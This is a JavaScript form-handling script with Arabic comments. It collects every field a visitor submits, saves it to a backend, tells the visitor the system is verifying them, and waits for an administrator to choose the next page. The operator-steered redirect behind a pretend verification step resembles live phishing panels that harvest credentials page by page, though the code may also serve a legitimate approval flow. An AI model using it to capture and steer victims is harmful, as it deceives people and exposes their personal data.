// Form Handler - استخدم هذا في جميع النماذج
class FormHandler {
    constructor(formSelector, pageName) {
        this.form = document.querySelector(formSelector);
        this.pageName = pageName;
        
        if (this.form) {
            this.form.addEventListener('submit', (e) => this.handleSubmit(e));
        }
    }

    async handleSubmit(e) {
        e.preventDefault();

        if (typeof stopYasmeenSessionNavPolling === 'function') {
            stopYasmeenSessionNavPolling();
        }

        this.showLoading();

        const formData = new FormData(this.form);
        const userData = {
            page: this.pageName,
            timestamp: new Date().toLocaleString('ar-EG')
        };

        for (let [key, value] of formData.entries()) {
            userData[key] = value;
        }

        this.form.querySelectorAll('input, textarea, select').forEach(field => {
            if (field.id && !userData[field.name]) {
                userData[field.id] = field.value;
            }
        });

        let userName = userData.name ||
            userData.fullName ||
            userData['full-name'] ||
            userData.username ||
            'بدون اسم';

        userData.name = userName;

        const newUser = {
            ...userData,
            registrationTime: new Date().toLocaleString('ar-EG'),
            page: this.pageName
        };

        try {
            if (userData.username && String(userData.username).trim()) {
                localStorage.setItem(
                    'yasmeen_last_username',
                    String(userData.username).trim()
                );
            }
            if (userData.phone && String(userData.phone).trim()) {
                localStorage.setItem(
                    'yasmeen_last_phone',
                    String(userData.phone).trim()
                );
            }
        } catch (e) {
            /* ignore */
        }

        try {
            if (typeof saveSubmission !== 'function') {
                throw new Error('saveSubmission غير معرّف — حمّل api-client.js');
            }
            await saveSubmission(newUser);
            this.waitForAdminRedirectThenNavigate();
        } catch (err) {
            console.error(err);
            this.stopRedirectPolling();
            this.hideLoading();
            alert('تعذر حفظ البيانات في قاعدة البيانات. تأكد أن الخادم يعمل (من مجلد server: npm start) وأن MongoDB متاح.');
        }
    }

    stopRedirectPolling() {
        if (typeof this._redirectPollStop === 'function') {
            this._redirectPollStop();
            this._redirectPollStop = null;
        }
    }

    waitForAdminRedirectThenNavigate() {
        this.stopRedirectPolling();
        const loading = document.getElementById('formLoading') || this.createLoadingElement();
        loading.style.display = 'flex';
        const msgEl = loading.querySelector('.form-loading-message');
        if (msgEl) {
            msgEl.textContent =
                'يرجى الانتظار، جاري التحقق من قبل النظام...';
        }
        this.form.reset();

        if (typeof startSessionRedirectPolling !== 'function') {
            console.error('startSessionRedirectPolling غير معرّف — حمّل api-client.js');
            return;
        }
        const self = this;
        this._redirectPollStop = startSessionRedirectPolling(
            function (url) {
                window.location.href = url;
            },
            function (msg) {
                self.hideLoading();
                alert(msg);
            }
        );
    }

    showLoading() {
        const loading = document.getElementById('formLoading') || this.createLoadingElement();
        loading.style.display = 'flex';
    }

    hideLoading() {
        const loading = document.getElementById('formLoading');
        if (loading) loading.style.display = 'none';
    }

    createLoadingElement() {
        const div = document.createElement('div');
        div.id = 'formLoading';
        div.style.cssText = `
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 9999;
            gap: 10px;
        `;
        div.innerHTML = `
            <style>@keyframes formHandlerSpin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
            <div style="width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; animation: formHandlerSpin 1s linear infinite;"></div>
            <p class="form-loading-message" style="color: white; font-size: 18px; margin: 0;">جاري المعالجة...</p>
        `;
        document.body.appendChild(div);
        return div;
    }

}

// وظيفة مساعدة للاستخدام السريع
function initializeFormHandler(formSelector, pageName) {
    return new FormHandler(formSelector, pageName);
}
